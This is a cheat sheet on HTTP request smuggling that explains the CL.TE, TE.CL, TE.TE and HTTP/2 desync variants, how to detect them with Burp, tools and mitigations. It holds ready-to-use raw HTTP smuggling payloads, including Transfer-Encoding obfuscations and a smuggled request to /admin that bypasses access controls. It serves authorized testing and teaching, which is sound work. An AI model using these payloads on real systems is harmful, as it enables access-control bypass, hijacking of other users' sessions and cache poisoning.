# 🔀 HTTP Request Smuggling Cheat Sheet
> **Scope:** Authorized testing only. Test systems you own or have explicit written permission to test (labs, CTFs, in-scope bug bounty). Smuggling can corrupt other users' requests — never target third-party traffic.

---
## ⚡ Quick Reference
| Variant | Front-end uses | Back-end uses | Note |
|---------|----------------|---------------|------|
| **CL.TE** | `Content-Length` | `Transfer-Encoding` | Back-end prefers TE |
| **TE.CL** | `Transfer-Encoding` | `Content-Length` | Back-end ignores TE |
| **TE.TE** | One TE value | Different TE value | Needs obfuscated duplicate TE |
| **H2.CL / H2.TE** | HTTP/2 | Downgraded HTTP/1.1 | Ambiguity after h2→h1 conversion |

> Desync = two servers disagree on where one request ends and the next begins.

---
## 🧠 Front/Back-End Desync
`Client → front-end (CDN/WAF/proxy) → back-end (app server)`: when both framing headers are present, the hops may disagree on where the body ends. Leftover bytes become the prefix of the next request on that connection.

- `Content-Length` = exact body byte count; `Transfer-Encoding: chunked` uses `<hex-size>\r\n<data>\r\n` chunks ended by `0\r\n\r\n`.
- RFC 7230 says TE overrides CL — real stacks often disagree.

---
## 🔍 Detection With Burp Repeater
1. Capture a baseline request to `<TARGET>/<PATH>`; force **HTTP/1.1** in Repeater attributes.
2. Add both framing headers; disable "Update Content-Length".
3. Use **Send group in sequence (single connection)** and send twice.
4. Repeat 5–10 times: look for ~5–10 s timeouts, `400/403/505`, or a changed response.

| Observation | Interpretation |
|-------------|----------------|
| First request hangs, second errors | CL.TE / TE.CL likely confirmed |
| Second response has another user's data | Desync confirmed — stop and report |
| `505` / `400` | Prefix bytes corrupted the next request |
| `403` on victim path | Front-end ACL bypassed |

---
## 💣 Core Payloads
### CL.TE — front-end CL, back-end TE
```http
POST /<PATH> HTTP/1.1
Host: <HOST>
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

*Body is exactly 6 bytes (`0\r\n\r\nG`); back-end stops at `0`, leaving `G` as the next request's prefix (`GPOST ...`).*

### TE.CL — front-end TE, back-end CL
```http
POST /<PATH> HTTP/1.1
Host: <HOST>
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /<PATH> HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

*`5c` = hex 92 = byte length of the smuggled prefix. Back-end reads only 4 bytes (`5c\r\n`).*

### TE.TE — make only one hop honor TE
```http
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
```
```http
Transfer-Encoding : chunked
Transfer-Encoding: chunked
```
```http
Transfer-Encoding: chunked
Transfer-Encoding: x
```

*Try each obfuscation with both body shapes; the desyncing pair reveals which hop ignores TE.*

---
## 🎯 Exploitation Patterns
```http
POST /<PATH> HTTP/1.1
Host: <HOST>
Content-Length: <EXACT_BODY_LENGTH>
Transfer-Encoding: chunked

0

GET /admin/<PATH> HTTP/1.1
Host: <HOST>
X-Ignored: 
```

*Set CL to the whole body length: front-end sees one POST, back-end processes the smuggled GET.*

*Response queue poisoning:* append a short smuggled GET and watch whether the next benign request on that connection receives the smuggled response — if so, report immediately and stop.

---
## 🛠️ Tools
| Tool | Use |
|------|-----|
| **HTTP Request Smuggler** | Automated CL.TE/TE.CL/TE.TE + h2 probes |
| **Burp Repeater** | Manual framing, single-connection sequencing |
| **smuggler.py** | Bulk detection across host lists |
| **h2cSmuggler** | h2c upgrade smuggling |
| **curl / Collaborator** | Repro and OOB proof with `<COLLAB>` |

---
## 💥 Impact
ACL/auth bypass · victim request hijacking (cookies, CSRF tokens) · response queue poisoning · cache poisoning · connection corruption/DoS.

---
## 🛡️ Mitigation
- Reject requests containing both `Content-Length` and `Transfer-Encoding`.
- Use one consistent HTTP parser; align CDN, WAF, load balancer, and app behavior.
- Strip TE at the edge; disable chunked parsing on the back-end if unused.
- Prefer HTTP/2 end-to-end; reject ambiguous pseudo-headers after downgrade.
- Cap body size and time out incomplete requests.

---
## ✅ Testing Checklist
- [ ] Authorization and scope confirmed
- [ ] Baseline captured in Repeater, HTTP/1.1 forced
- [ ] CL.TE probe sent twice on one connection
- [ ] TE.CL probe sent twice on one connection
- [ ] TE.TE obfuscations tried with both body shapes
- [ ] h2 → HTTP/1.1 downgrade considered
- [ ] Timing/errors documented; no third-party traffic touched
- [ ] `<TARGET>`, `<HOST>`, `<PATH>`, `<COLLAB>` placeholders retained

---
## 📚 References
- [PortSwigger — HTTP request smuggling](https://portswigger.net/web-security/request-smuggling)
- [PortSwigger — Finding smuggling vulnerabilities](https://portswigger.net/web-security/request-smuggling/finding)
- [HTTP Request Smuggler (GitHub)](https://github.com/portswigger/http-request-smuggler)
- [RFC 7230 §3.3 — Message Body Length](https://www.rfc-editor.org/rfc/rfc7230#section-3.3)

---
**🔀 Happy (authorized) hacking!**
